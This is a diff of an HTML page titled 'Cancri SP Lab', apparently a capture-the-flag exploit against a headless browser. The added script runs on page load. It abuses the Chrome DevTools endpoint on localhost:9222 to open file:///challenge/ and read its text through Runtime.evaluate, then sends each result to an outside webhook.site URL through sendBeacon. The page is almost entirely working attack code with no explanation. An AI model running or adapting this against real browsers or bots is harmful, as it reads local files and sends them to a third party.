@@ -6,33 +6,68 @@
 </head>
 <body>
   <h1>Cancri SP Lab</h1>
-  <pre id="status">Starting diagnostic...</pre>
+  <pre id="status">Waiting...</pre>
 
   <script>
     const webhook =
       "https://webhook.site/fa6817a2-e483-45f5-b5ba-2b895046ab55";
 
-    const status = document.getElementById("status");
+    function log(...args) {
+      const data = JSON.stringify(args, null, 2);
+      document.getElementById("status").textContent +=
+        "\n" + data;
 
-    async function report(data) {
-      status.textContent += "\n" + JSON.stringify(data);
+      navigator.sendBeacon(
+        webhook,
+        new Blob([data], { type: "text/plain" })
+      );
+    }
 
+    const sleep = ms =>
+      new Promise(resolve => setTimeout(resolve, ms));
+
+    async function run() {
       try {
-        await fetch(webhook, {
-          method: "POST",
-          mode: "no-cors",
-          body: JSON.stringify(data)
-        });
-      } catch (e) {
-        status.textContent += "\nWebhook error: " + e.message;
+        log("Starting CDP");
+
+        const response = await fetch(
+          "http://localhost:9222/json/new?file:///challenge/",
+          { method: "PUT" }
+        );
+
+        const target = await response.json();
+        log("CDP target", target);
+
+        const ws = new WebSocket(
+          target.webSocketDebuggerUrl
+        );
+
+        ws.onerror = () => log("WebSocket error");
+
+        ws.onopen = async () => {
+          log("WebSocket connected");
+
+          await sleep(500);
+
+          ws.send(JSON.stringify({
+            id: 1,
+            method: "Runtime.evaluate",
+            params: {
+              expression: "document.body.innerText"
+            }
+          }));
+        };
+
+        ws.onmessage = event => {
+          log("CDP result", event.data);
+        };
+
+      } catch (error) {
+        log("ERROR", error.message, error.stack);
       }
     }
 
-    report({
-      stage: "page_loaded",
-      url: location.href,
-      time: new Date().toISOString()
-    });
+    run();
   </script>
 </body>
 </html>
